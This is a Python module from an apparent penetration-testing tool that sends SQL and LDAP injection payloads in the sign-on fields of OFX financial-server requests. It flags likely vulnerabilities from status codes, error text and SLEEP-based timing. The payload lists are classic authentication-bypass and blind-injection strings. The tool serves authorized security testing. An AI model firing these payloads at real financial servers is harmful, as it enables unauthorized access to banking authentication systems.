"""
Authentication Injection Testing Module

Tests for SQL and LDAP injection in authentication fields.
"""

from typing import Dict, Any, List
import time

from ofxpwn.core.base_module import BaseModule
from ofxpwn.core.config import Config
from ofxpwn.core.logger import Logger
from ofxpwn.core.protocol import OFXRequest
from ofxpwn.core.sender import OFXSender


class InjectionModule(BaseModule):
    """SQL/LDAP injection testing in authentication"""

    @classmethod
    def get_description(cls) -> str:
        return "Test for SQL/LDAP injection in authentication fields"

    def run(self, config: Config, logger: Logger) -> Dict[str, Any]:
        """Run injection testing"""
        self.config = config
        self.logger = logger

        logger.info("="*60)
        logger.info("Authentication Injection Testing")
        logger.info("="*60)

        ofx = OFXRequest(
            org=config.get_target_org(),
            fid=config.get_target_fid()
        )
        sender = OFXSender(config, logger)

        results = {
            'payloads_tested': 0,
            'interesting_responses': [],
            'potential_vulnerabilities': []
        }

        # SQL Injection payloads
        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "admin'--",
            "admin' #",
            "' OR 1=1--",
            "') OR ('1'='1",
            "' UNION SELECT NULL--",
            "admin' AND SLEEP(5)--",
        ]

        # LDAP Injection payloads
        ldap_payloads = [
            "*",
            "admin*",
            "admin)(&",
            "*)(objectClass=*",
            "admin)(|(password=*))",
        ]

        # Test SQL injection in username
        logger.info("\nTesting SQL injection in username field...")

        for payload in sql_payloads:
            logger.info(f"  Testing: {payload}")

            request_body = ofx.build_sgml_header() + "<OFX>\n"
            request_body += ofx.build_signon_sgml(payload, "test")
            request_body += "</OFX>\n"

            start_time = time.time()
            result = sender.send_request(
                request_body,
                save_name=f"sqli_username_{results['payloads_tested']}"
            )
            elapsed = time.time() - start_time

            results['payloads_tested'] += 1

            if not result.get('success'):
                continue

            # Check for signs of SQL injection
            ofx_status = result.get('ofx_status')
            response_text = result.get('response_text', '')

            # Different status code might indicate SQL injection
            if ofx_status and ofx_status not in [15500, 2000]:
                logger.finding(
                    'HIGH',
                    'Potential SQL Injection',
                    f'Payload "{payload}" returned OFX status {ofx_status}',
                    f'Different from normal auth failure (15500)'
                )
                results['potential_vulnerabilities'].append({
                    'type': 'sqli',
                    'field': 'username',
                    'payload': payload,
                    'status': ofx_status
                })

            # Check for SQL error messages
            sql_errors = ['sql', 'syntax', 'mysql', 'postgres', 'oracle', 'mssql', 'database']
            if any(err in response_text.lower() for err in sql_errors):
                logger.finding(
                    'HIGH',
                    'SQL Error Disclosure',
                    f'SQL error message in response to payload: {payload}',
                    'Database error messages disclosed'
                )
                results['potential_vulnerabilities'].append({
                    'type': 'error_disclosure',
                    'field': 'username',
                    'payload': payload
                })

            # Time-based detection (SLEEP payload)
            if 'SLEEP' in payload and elapsed > 4:
                logger.finding(
                    'CRITICAL',
                    'Time-Based SQL Injection',
                    f'Response delayed {elapsed:.2f}s with SLEEP payload',
                    'Blind SQL injection confirmed via timing'
                )
                results['potential_vulnerabilities'].append({
                    'type': 'blind_sqli',
                    'field': 'username',
                    'payload': payload,
                    'delay': elapsed
                })

            time.sleep(0.3)

        # Test LDAP injection
        logger.info("\nTesting LDAP injection in username field...")

        for payload in ldap_payloads:
            logger.info(f"  Testing: {payload}")

            request_body = ofx.build_sgml_header() + "<OFX>\n"
            request_body += ofx.build_signon_sgml(payload, "test")
            request_body += "</OFX>\n"

            result = sender.send_request(
                request_body,
                save_name=f"ldap_username_{results['payloads_tested']}"
            )

            results['payloads_tested'] += 1

            if not result.get('success'):
                continue

            ofx_status = result.get('ofx_status')
            response_text = result.get('response_text', '')

            # Different response might indicate LDAP injection
            if ofx_status and ofx_status not in [15500, 2000]:
                logger.finding(
                    'MEDIUM',
                    'Potential LDAP Injection',
                    f'LDAP payload "{payload}" returned status {ofx_status}',
                    'May indicate LDAP authentication backend'
                )
                results['potential_vulnerabilities'].append({
                    'type': 'ldap',
                    'field': 'username',
                    'payload': payload,
                    'status': ofx_status
                })

            # Check for LDAP error messages
            ldap_errors = ['ldap', 'directory', 'active directory', 'distinguished']
            if any(err in response_text.lower() for err in ldap_errors):
                logger.finding(
                    'MEDIUM',
                    'LDAP Error Disclosure',
                    f'LDAP-related error with payload: {payload}',
                    'LDAP backend confirmed'
                )

            time.sleep(0.3)

        # Test SQL injection in password field
        logger.info("\nTesting SQL injection in password field...")

        for payload in sql_payloads[:4]:  # Test subset in password
            request_body = ofx.build_sgml_header() + "<OFX>\n"
            request_body += ofx.build_signon_sgml("admin", payload)
            request_body += "</OFX>\n"

            result = sender.send_request(
                request_body,
                save_name=f"sqli_password_{results['payloads_tested']}"
            )

            results['payloads_tested'] += 1
            time.sleep(0.3)

        # Summary
        logger.info("\n" + "="*60)
        logger.info("Injection Testing Summary")
        logger.info("="*60)
        logger.info(f"Payloads tested: {results['payloads_tested']}")
        logger.info(f"Potential vulnerabilities: {len(results['potential_vulnerabilities'])}")

        if results['potential_vulnerabilities']:
            logger.warning("Potential injection vulnerabilities detected!")
            logger.warning("Review findings and saved evidence for confirmation")
        else:
            logger.success("No obvious injection vulnerabilities detected")
            logger.info("Server appears to properly sanitize/parameterize inputs")

        stats = sender.get_stats()
        logger.info(f"\nRequests sent: {stats['requests_sent']}")

        return results
